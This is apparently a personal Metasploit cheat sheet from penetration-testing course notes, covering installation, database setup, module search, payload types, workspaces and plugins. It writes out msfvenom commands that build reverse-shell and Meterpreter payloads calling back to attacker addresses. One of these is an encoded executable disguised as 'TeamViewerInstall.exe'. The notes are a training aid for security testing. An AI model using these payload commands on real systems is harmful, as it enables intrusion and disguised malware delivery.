#metasploit
The `MSF engagement` structure can be divided into five main categories.
- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation
# Metasploit Installation
_with apt_
```bash
sudo apt update && sudo apt install metasploit-framework
```

## Program Path
```bash
ls /usr/share/metasploit-framework/modules    # modules
ls /usr/share/metasploit-framework/plugins/   # plugin
ls /usr/share/metasploit-framework/scripts/   # scripts
ls /usr/share/metasploit-framework/tools/     # tools
```

_Modules_
```bash
<No.> <type>/<os>/<service>/<name>            # path structure
794   exploit/windows/ftp/scriptftp_list      # example
```

## Manage DB
_Manage services_
```bash
sudo service postgresql status                # inspect services
sudo systemctl start postgresql               # start services
sudo msfdb init                               # init db
sudo msfdb status                             # inspect db services
```

_Connect to DB_
```bash
sudo msfdb run                                # connect to db
```

_Reinitiate the Database_
```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

msf6 > db_status
```
# Basic Usage
_launch `msfconsole`_
```bash
msfconsole
msfconsole -q    # no banner
```

_Search modules_

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|
```bash
help search                               # all search options
search eternalromance                     # example for simple exploit search
search eternalromance type:exploit        # specify type
search type:exploit platform:windows cve:2021 rank:excellent microsoft # Acurance
```

# Payloads
We have three type of payloads
- Singles -> All payload in single point (_file_)
- Stagers -> A stager in attacker machine is on hold the call back
- Stages ->  Payload components that are downloaded by stager's modules

Whether or not a payload is staged is represented by `/` in the payload name.

For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).
###### Important Payloads
The table below contains the most common payloads used for Windows machines and their respective descriptions.

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads. These are not in the scope of this course, but feel free to research them in our free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.
##### msfvenom
_List Payloads_
```bash
msfvenom -l payloads
msf6 > show payloads
```

> [!NOTE] Staged vs Stageless
> A _steged payload_ is a payload that is sent to the target machine in multiple rounds, in contrast a _stageless payload_ is a single payload that is sent to the taget in a single round, this helps in scenarios of limited bandwidth or social engeniring techniques

_Example stageless payload for linux_
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > <name>.elf
```

_Example stageless payload for windows_
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > <name>.exe
```

_Search in a console_
```bash
msf6 > grep meterpreter show payloads
msf6 > grep -c meterpreter show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```
# Workflow
_Select modules_
```bash
search <Key Words>        # search for keywords
use <NO.>                 # use index
option                    # display module options
info                      # display module info
```

_Customize Module_
```bash
set RHOSTS <IP>           # set target
setg RHOSTS <IP>          # set target permanently
show targets              # show target available for a module
set target <NO.>          # set target by index
set payload <NO.>         # set payload
show encoders             # search encoders
```

_Encode and Payloads_
we can use `msfpayload` and `msfencode`
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

After 2015 its are merge in `msfvenom`
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

_Generation with encoding_
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

_Test Payloads with VirusTotal_
```bash
msf-virustotal -k <API key> -f <FILE>
```

_Run_
```bash
run
exploit
```

## Add Work Space at Workflow 
For use it check if the database is healthy.
```bash
msf6 > workspace                # list workspaces
msf6 > workspace -a <NAME>      # add workspace
msf6 > workspace -d <NAME>      # delete workspace
msf6 > workspace <NAME>         # set workspace
msf6 > workspace -h             # view help
```

### Add scan to workspace
for do that we need a scan with nmap .xml
```bash
msf6 > db_import Target.xml        # import scan
msf6 > hosts                       # show host scan
msf6 > services                    # show services
msf6 > db_nmap <nmap flags> <IP>   # unse nmap inside msfconsole
```

_Backup Workspace_
```bash
msf6 > db_export -h                # view help
msf6 > db_export -f xml backup.xml # example exporting
```

_Hosts an Services_
With this features we can use information in workspace in other tools (msfconsole plugin es. nessus) 
```bash
hosts -h
services -h
```

_Creds and Loots_
Other two important storage point 
```bash
creds -h
loot -h
```

# Plugin 
Nice Plugin
- [nMap (pre-installed)](https://nmap.org/)
- [NexPose (pre-installed)](https://sectools.org/tool/nexpose/)
- [Nessus (pre-installed)](https://www.tenable.com/products/nessus)|
- [Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)
- [Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)
- [Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)
- [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)
- [Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
- [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)